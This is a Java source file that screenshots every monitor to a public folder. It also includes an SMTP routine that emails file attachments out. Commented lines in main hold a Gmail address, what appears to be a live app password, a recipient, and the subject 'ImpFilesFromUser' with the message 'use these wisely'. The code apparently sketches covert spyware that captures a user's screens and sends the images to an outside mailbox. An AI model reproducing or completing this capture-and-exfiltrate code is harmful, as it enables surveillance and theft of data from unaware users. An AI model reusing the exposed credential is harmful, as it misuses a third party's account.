import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.image.BufferedImage;
import java.io.File; 
import javax.imageio.ImageIO;
import java.io.IOException;
import java.awt.AWTException;
import java.util.Date;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.util.Properties;
import javax.mail.*;
import javax.mail.internet.*;


public class screenshots{   
   
   
   public static void main(String[] args) {
      makeScreenshot();
      // String host = "smtp.gmail.com";
      // String port = "587";
      // String mailFrom = "sozlpsn@gmail.com";
      // String password = "xvgwcrjtfcdddekc";
      // String mailTo = "seanozalpasan@gmail.com";
      // String subject = "ImpFilesFromUser";
      // String message = "use these wisely";
   }

   public static final void makeScreenshot() {
      Date currentDate = new Date();
      String timeIndex = currentDate.toString();
      timeIndex = timeIndex.replace(" ", "_");
      timeIndex = timeIndex.replace(":", "-");
      System.out.println(timeIndex);
      try {
         GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
         GraphicsDevice[] screens = ge.getScreenDevices();

         for(int i = 0; i < screens.length; i++){
            Robot rob = new Robot();
            Rectangle rect = screens[i].getDefaultConfiguration().getBounds();
            BufferedImage captu = rob.createScreenCapture(rect);
            String filePath = "C:/Users/Public/Pictures/" + "screen" + i + "_" + timeIndex + ".jpg";
            //String filePath = "/usr/local/src/" + "screen" + i + "_" + timeIndex + ".jpg";
            File outputFile = new File(filePath);
            ImageIO.write(captu, "jpg", outputFile);
         }
      } 
      catch (IOException ioe) {
         ioe.printStackTrace();
      } catch (AWTException e){
         e.printStackTrace();
      } 
  }

  public static void sendEmailWithAttachments(String host, String port,
        final String userName, final String password, String toAddress,
        String subject, String message, String[] attachFiles)
        throws AddressException, MessagingException {

     // Set up server properties
     Properties properties = new Properties();
     properties.put("mail.smtp.host", host);
     properties.put("mail.smtp.port", port);
     properties.put("mail.smtp.auth", "true");
     properties.put("mail.smtp.starttls.enable", "true");

     // Create a session with authentication
     Authenticator auth = new Authenticator() {
        public PasswordAuthentication getPasswordAuthentication() {
           return new PasswordAuthentication(userName, password);
        }
     };
     Session session = Session.getInstance(properties, auth);

     // Create a new email message
     Message msg = new MimeMessage(session);

     msg.setFrom(new InternetAddress(userName));
     InternetAddress[] toAddresses = { new InternetAddress(toAddress) };
     msg.setRecipients(Message.RecipientType.TO, toAddresses);
     msg.setSubject(subject);
     msg.setSentDate(new java.util.Date());

     // Create the message part
     MimeBodyPart messageBodyPart = new MimeBodyPart();
     messageBodyPart.setContent(message, "text/html");

     // Create a multipart message for attachments
     Multipart multipart = new MimeMultipart();
     multipart.addBodyPart(messageBodyPart);

     // Add attachments
     if (attachFiles != null && attachFiles.length > 0) {
        for (String filePath : attachFiles) {
           MimeBodyPart attachPart = new MimeBodyPart();
           try {
              attachPart.attachFile(new File(filePath));
           } catch (Exception e) {
              e.printStackTrace();
           }
           multipart.addBodyPart(attachPart);
        }
     }

     // Set the complete message parts
     msg.setContent(multipart);

     // Send the message
     Transport.send(msg);
  }

}
